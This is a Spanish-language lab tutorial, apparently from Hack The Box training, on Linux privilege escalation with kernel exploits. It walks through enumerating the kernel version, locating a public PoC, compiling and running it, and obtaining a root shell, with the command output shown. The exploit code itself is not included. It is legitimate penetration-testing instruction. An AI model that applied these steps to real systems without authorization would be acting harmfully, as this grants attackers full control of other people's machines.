Los exploits a nivel de kernel existen para una variedad de versiones del kernel de Linux. Un ejemplo muy conocido es [Dirty COW](https://github.com/dirtycow/dirtycow.github.io) (CVE-2016-5195). Estos aprovechan vulnerabilidades en el kernel para ejecutar código con privilegios de root. Es muy común encontrar sistemas que son vulnerables a exploits de kernel. Puede ser difícil hacer un seguimiento de los sistemas heredados, y pueden estar excluidos de los parches debido a problemas de compatibilidad con ciertos servicios o aplicaciones.

La escalada de privilegios usando un exploit de kernel puede ser tan simple como descargarlo, compilarlo y ejecutarlo. Algunos de estos exploits funcionan directamente, mientras que otros requieren modificación. Una manera rápida de identificar exploits es emitir el comando `uname -a` y buscar en Google la versión del kernel.

Nota: Los exploits de kernel pueden causar inestabilidad en el sistema, así que usa precaución al ejecutarlos contra un sistema de producción.

---

## Kernel Exploit Example

Empecemos revisando el nivel del kernel y la versión del sistema operativo Linux.

```r
uname -a

Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

```r
cat /etc/lsb-release 

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
```

Podemos ver que estamos en el Kernel 4.4.0-116 de Linux en una caja Ubuntu 16.04.4 LTS. Una búsqueda rápida en Google para `linux 4.4.0-116-generic exploit` muestra [este](https://vulners.com/zdt/1337DAY-ID-30003) exploit PoC. Luego descárgalo al sistema usando `wget` u otro método de transferencia de archivos. Podemos compilar el código del exploit usando [gcc](https://linux.die.net/man/1/gcc) y establecer el bit ejecutable usando `chmod +x`.

```r
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
```

A continuación, ejecutamos el exploit y esperamos obtener acceso como root.

```r
./kernel_exploit 

task_struct = ffff8800b71d7000
uidptr = ffff8800b95ce544
spawning root shell
```

Finalmente, podemos confirmar el acceso como root a la caja.


```r
root@htb[/htb]# whoami

root
```

Nota: El sistema objetivo ha sido actualizado, pero sigue siendo vulnerable. Usa un exploit de kernel creado en 2021.